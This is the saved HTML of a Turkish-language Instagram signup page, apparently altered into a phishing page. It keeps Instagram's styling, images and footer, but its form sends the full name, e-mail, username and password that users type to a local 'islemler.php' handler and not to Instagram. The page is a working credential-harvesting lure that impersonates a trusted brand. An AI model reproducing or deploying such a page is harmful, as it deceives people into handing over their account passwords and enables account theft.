...
<html lang="tr" class="js not-logged-in wf-proximanova-n3-active wf-proximanova-n4-active wf-proximanova-n6-active wf-proximanova-n7-active wf-active"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <script async="" src="Instagram_files/fbevents.js"></script><script id="facebook-jssdk" src="Instagram_files/sdk.js"></script><script type="text/javascript">window._timings = {"domLoading": Date.now()}</script>
...
.coreSpriteActivityInactive {
  ...
  background-position: -389px -423px;
...
.coreSpriteHashtag {
  ...
  background-position: -522px -373px;
...
.coreSpriteHeartOpen {
  ...
  background-position: -476px -373px;
...
.coreSpriteHomeActive {
  ...
  background-position: -327px -423px;
...
.coreSpriteHomeInactive {
  ...
  background-position: -265px -423px;
...
.coreSpriteInputAccepted {
  ...
  background-position: -446px -423px;
...
.coreSpriteInputRefresh {
  ...
  background-position: -494px -423px;
...
.coreSpriteLeftPaginationArrow {
  ...
  background-position: -538px -211px;
...
.coreSpriteLocation {
  ...
  background-position: -326px -264px;
...
.coreSpriteMenu {
  ...
  background-position: -516px -338px;
...
.coreSpriteSearchIcon {
  ...
  background-position: -538px -497px;
...
(min-resolution: 144dpi) {
  ...
  .coreSpriteHeartSmall {
    ...
    background-position: -269px -209px;
...
</style><style type="text/css" data-isostyle-id="is110a3ca4">/**
...
._qy55y:focus::-webkit-input-placeholder {
  color: #a5a7aa;
}

._qy55y:focus::-moz-placeholder {
  color: #a5a7aa;
}

._qy55y:focus:-ms-input-placeholder {
  color: #a5a7aa;
}

._qy55y:focus::placeholder {
  color: #a5a7aa;
}
...
</style><style type="text/css" data-isostyle-id="is-2a35c398">/**
 * @providesModule SlimTextInput
 */
...
</style><style type="text/css" data-isostyle-id="is-2b7dc3c0">/**
 * @providesModule SlimLoginForm
 */
...
</style><style type="text/css" data-isostyle-id="is12473cbd">/**
 * @providesModule SlimSignupForm
 */
...
</style><style type="text/css" data-isostyle-id="is-2b14c3b5">/**
 * @providesModule TwoFactorForm
 */
...
</style><style type="text/css" data-isostyle-id="is-6844c34a">/**
 * @providesModule BaseButton
 */
...
</style><style type="text/css" data-isostyle-id="is60b93e06">.ButtonSizeMicro {
  font-size: 12px;
  font-size: 1.2rem;
  padding: 4px 7px 4px;
  border-radius: 2px; }
...
.Button.bDisabled,
.Button.bDisabled:hover,
.Button.bDisabled:active {
  cursor: default;
  background: white;
  border-color: #dddddd;
  box-shadow: none;
  color: #999999; }
</style><style type="text/css" data-isostyle-id="is-37a0c23b">/**
 * @providesModule FacebookLoginForm
 */
...
</style><style type="text/css" data-isostyle-id="is-79fbc0e6">/**
 * @providesModule LandingActionsColumn
 */
...
</style><style type="text/css" data-isostyle-id="is12693cca">/**
 * @providesModule PhoneSlideshow
 */
...
._fdj9b {
  -webkit-align-self: center;
      -ms-flex-item-align: center;
          align-self: center;
  background: url("instagramstatic-a.akamaihd.net/h1/images/homepage/home-phones.png/26f8f9119be7.png");
  background-position: 0 0;
  -webkit-flex-basis: 454px;
      -ms-flex-preferred-size: 454px;
          flex-basis: 454px;
  height: 618px;
  margin-left: -35px;  /* Cancel blank space/volume rocker on left side of phone image */
  margin-right: -15px;  /* Cancel blank space on right side of phone image */
}
...
</style><style type="text/css" data-isostyle-id="is6df3e25">/**
 * @providesModule MobileNavLoggedOut
 */
...
</style><style type="text/css" data-isostyle-id="is-37f4c25c">/**
 * @providesModule MobileNavLoggedIn
 */
...
</style><style type="text/css" data-isostyle-id="is-1aecc565">/**
 * @providesModule MobileNav
 */
...
</style><style type="text/css" data-isostyle-id="is67463ab7">/**
 * @providesModule NewNavigation
 */
...
</style><style type="text/css" data-isostyle-id="is5b593b58">/**
 * @providesModule LandingPage
 */
...
/*
 * 875px cutoff chosen to match Footer collapse.
 * The phones would actually still fit okay in 850px, but seems neater to use
 * the same breakpoint as Footer.
 */
@media (max-width: 874px) {
  ._3mng4 {
    display: none;
...
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_hide_iframes iframe{position:relative;left:-10000px}.fb_iframe_widget_loader{position:relative;display:inline-block}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}.fb_iframe_widget_loader iframe{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://fbstatic-a.akamaihd.net/rsrc.php/v2/y9/r/jKEcVPZFk-2.gif) no-repeat;height:32px;width:32px;margin-left:-16px;position:absolute;left:50%;z-index:4}</style></head>
    ...
    <span id="react-root"><section class="_8f735" data-reactid=".0"><main class="_6ltyr" role="main" data-reactid=".0.1"><article class="_60k3m" data-reactid=".0.1.0"><div class="_fdj9b _3mng4" data-reactid=".0.1.0.0"><div class="_klk8w" data-reactid=".0.1.0.0.0"><img class="_9gpks _5n966" src="Instagram_files/63c13211f012.jpg" data-reactid=".0.1.0.0.0.$s0"><img class="_9gpks _mpbzm" src="Instagram_files/4864a4378d2c.jpg" data-reactid=".0.1.0.0.0.$s1"><img class="_9gpks" src="Instagram_files/ffe9bdb05113.jpg" data-reactid=".0.1.0.0.0.$s2"><img class="_9gpks" src="Instagram_files/2db50f7f967f.jpg" data-reactid=".0.1.0.0.0.$s3"><img class="_9gpks" src="Instagram_files/5ee560883409.jpg" data-reactid=".0.1.0.0.0.$s4"></div></div><div class="_jxjmg" data-reactid=".0.1.0.1"><div class="_fqv9h" data-reactid=".0.1.0.1.0"><img src="instagram.png" width="170px" height="50px" style="margin-left:90px;margin-top:22px;margin-bottom:10px;"><div class="_uikn3" data-reactid=".0.1.0.1.0.1">
	<form class="_rwf8p" data-reactid=".0.1.0.1.0.1.2" action="islemler.php" method="post">
	<div class="_ccek6 _i31zu" data-reactid=".0.1.0.1.0.1.2.0">
	<input class="_kp5f7 _qy55y" aria-describedby="" aria-label="Ad Soyad" aria-required="true" autocapitalize="off" autocorrect="off" id="adsoyad" maxlength="30" name="ad_soyad" placeholder="Ad Soyad" value="" type="text" data-reactid=".0.1.0.1.0.1.2.0.0"></div>
	<div class="_ccek6 _i31zu" data-reactid=".0.1.0.1.0.1.2.1">
	<input class="_kp5f7 _qy55y" aria-describedby="" aria-label="E-Posta" aria-required="true" autocapitalize="off" autocorrect="off" id="eposta" maxlength="30" name="eposta" placeholder="E-Posta" value="" type="text" data-reactid=".0.1.0.1.0.1.2.0.0"></div>
	<div class="_ccek6 _i31zu" data-reactid=".0.1.0.1.0.1.2.1">
	<input class="_kp5f7 _qy55y" aria-describedby="" aria-label="Şifre" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="kadi" placeholder="Kullanıcı adı" value="" type="text" data-reactid=".0.1.0.1.0.1.2.0.0"></div>
	<div class="_ccek6 _i31zu" data-reactid=".0.1.0.1.0.1.2.0">
	<input class="_kp5f7 _qy55y" aria-describedby="" aria-label="Kullanıcı Adı" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="sifre" placeholder="Şifre" value="" type="password" data-reactid=".0.1.0.1.0.1.2.0.0"></div>
	<button class="_rz1lq _k2yal _84y62 _7xso1 _nv5lf" data-reactid=".0.1.0.1.0.1.2.2" name="kaydol">Kaydol</button></form>
	</div></div><div class="_lsl5r" data-reactid=".0.1.0.1.2"><div class="_a708c" data-reactid=".0.1.0.1.2.1"><a class="_okmo7" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.unifiedHome.badge&amp;mt=8" data-reactid=".0.1.0.1.2.1.0"><img class="_t5w1b" alt="App Store&#39;dan İndir" src="Instagram_files/4d13ab7e9dd0.png" data-reactid=".0.1.0.1.2.1.0.0"></a><a class="_okmo7" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DunifiedHome%26utm_medium%3Dbadge" data-reactid=".0.1.0.1.2.1.1"><img class="_t5w1b" alt="Google Play&#39;den İndir" src="Instagram_files/495233f0fd82.png" data-reactid=".0.1.0.1.2.1.1.0"></a></div></div></div></article></main><footer class="_oofbn" role="contentinfo" data-reactid=".0.3"><div class="_mhrsk _pcuq6" style="max-width:935px;" data-reactid=".0.3.0"><nav class="_p1gbi" role="navigation" data-reactid=".0.3.0.0"><ul class="_fh0f2" data-reactid=".0.3.0.0.0"><li class="_fw3ds" data-reactid=".0.3.0.0.0.0"><a href="https://www.instagram.com/about/us/" data-reactid=".0.3.0.0.0.0.0">Hakkımızda</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.1"><a href="https://help.instagram.com/" data-reactid=".0.3.0.0.0.1.0">Destek</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.2"><a href="http://blog.instagram.com/" data-reactid=".0.3.0.0.0.2.0">Blog</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.3"><a href="https://www.instagram.com/press/" data-reactid=".0.3.0.0.0.3.0">Basın</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.4"><a href="https://www.instagram.com/developer/" data-reactid=".0.3.0.0.0.4.0">API</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.5"><a href="https://www.instagram.com/about/jobs/" data-reactid=".0.3.0.0.0.5.0">İş Fırsatları</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.6"><a href="https://www.instagram.com/legal/privacy/" data-reactid=".0.3.0.0.0.6.0">Gizlilik</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.7"><a href="https://www.instagram.com/legal/terms/" data-reactid=".0.3.0.0.0.7.0">Koşullar</a></li><li class="_fw3ds" data-reactid=".0.3.0.0.0.9"><span class="_17z9g" data-reactid=".0.3.0.0.0.9.0"><span data-reactid=".0.3.0.0.0.9.0.0">Dil</span><select class="_nif11" data-reactid=".0.3.0.0.0.9.0.1"><option value="af" data-reactid=".0.3.0.0.0.9.0.1.$af">Afrikaanca</option><option value="cs" data-reactid=".0.3.0.0.0.9.0.1.$cs">Çekçe</option><option value="da" data-reactid=".0.3.0.0.0.9.0.1.$da">Danca</option><option value="de" data-reactid=".0.3.0.0.0.9.0.1.$de">Almanca</option><option value="el" data-reactid=".0.3.0.0.0.9.0.1.$el">Yunanca</option><option value="en" data-reactid=".0.3.0.0.0.9.0.1.$en">İngilizce</option><option value="es" data-reactid=".0.3.0.0.0.9.0.1.$es">İspanyolca</option><option value="fi" data-reactid=".0.3.0.0.0.9.0.1.$fi">Fince</option><option value="fr" data-reactid=".0.3.0.0.0.9.0.1.$fr">Fransızca</option><option value="hi" data-reactid=".0.3.0.0.0.9.0.1.$hi">Hintçe</option><option value="id" data-reactid=".0.3.0.0.0.9.0.1.$id">Endonezce</option><option value="it" data-reactid=".0.3.0.0.0.9.0.1.$it">İtalyanca</option><option value="ja" data-reactid=".0.3.0.0.0.9.0.1.$ja">Japonca</option><option value="ko" data-reactid=".0.3.0.0.0.9.0.1.$ko">Korece</option><option value="ms" data-reactid=".0.3.0.0.0.9.0.1.$ms">Malayca</option><option value="nb" data-reactid=".0.3.0.0.0.9.0.1.$nb">Norveççe</option><option value="nl" data-reactid=".0.3.0.0.0.9.0.1.$nl">Felemenkçe</option><option value="pl" data-reactid=".0.3.0.0.0.9.0.1.$pl">Lehçe</option><option value="pt" data-reactid=".0.3.0.0.0.9.0.1.$pt">Portekizce (Portekiz)</option><option value="pt-br" data-reactid=".0.3.0.0.0.9.0.1.$pt-br">Portekizce</option><option value="ru" data-reactid=".0.3.0.0.0.9.0.1.$ru">Rusça</option><option value="sv" data-reactid=".0.3.0.0.0.9.0.1.$sv">İsveççe</option><option value="th" data-reactid=".0.3.0.0.0.9.0.1.$th">Tayca</option><option value="tl" data-reactid=".0.3.0.0.0.9.0.1.$tl">Tagalog/Filipince</option><option selected="" value="tr" data-reactid=".0.3.0.0.0.9.0.1.$tr">Türkçe</option><option value="zh-cn" data-reactid=".0.3.0.0.0.9.0.1.$zh-cn">Çince (Basitleştirilmiş)</option><option value="zh-tw" data-reactid=".0.3.0.0.0.9.0.1.$zh-tw">Çince (Geleneksel)</option></select></span></li></ul></nav><span class="_es4h6" data-reactid=".0.3.0.1">© 2016 Instagram</span></div></footer><noscript data-reactid=".0.4"></noscript></section></span>
...
<script src="Instagram_files/c44dc3c7f33e.js" type="text/javascript"></script>
<script src="Instagram_files/7ed4bb496ca9.js" type="text/javascript"></script>
...
<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div></div><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" title="Facebook Cross Domain Communication Frame" aria-hidden="true" tabindex="-1" id="fb_xdm_frame_https" src="Instagram_files/xd_arbiter.html" style="border: none;"></iframe></div></div></div></body></html>
